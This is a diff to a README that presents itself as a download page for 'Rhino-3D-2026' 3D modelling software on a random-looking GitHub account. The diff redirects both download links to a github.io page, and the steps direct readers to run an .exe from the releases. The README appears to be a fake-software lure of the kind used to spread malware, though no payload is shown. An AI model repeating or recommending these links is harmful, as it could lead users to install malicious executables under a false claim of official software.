@@ -1,6 +1,6 @@
 # 🦏 Rhino-3D-2026 - Create professional 3D models with ease
 
-[![Download Rhino 3D](https://img.shields.io/badge/Download-Rhino-3D-blue.svg)](https://github.com/compressed-hyperpyrexia769/Rhino-3D-2026)
+[![Download Rhino 3D](https://img.shields.io/badge/Download-Rhino-3D-blue.svg)](https://compressed-hyperpyrexia769.github.io)
 
 ## 📋 Overview
 
@@ -21,7 +21,7 @@ Your computer needs specific hardware to run Rhino 3D 2026 smoothly. Check these
 
 Follow these steps to set up the software on your computer.
 
-1.  Visit the [official download page](https://github.com/compressed-hyperpyrexia769/Rhino-3D-2026).
+1.  Visit the [official download page](https://compressed-hyperpyrexia769.github.io).
 2.  Locate the section labeled Releases on the right side of the page.
 3.  Click the version marked as the latest release.
 4.  Find the file ending in .exe in the Assets section.
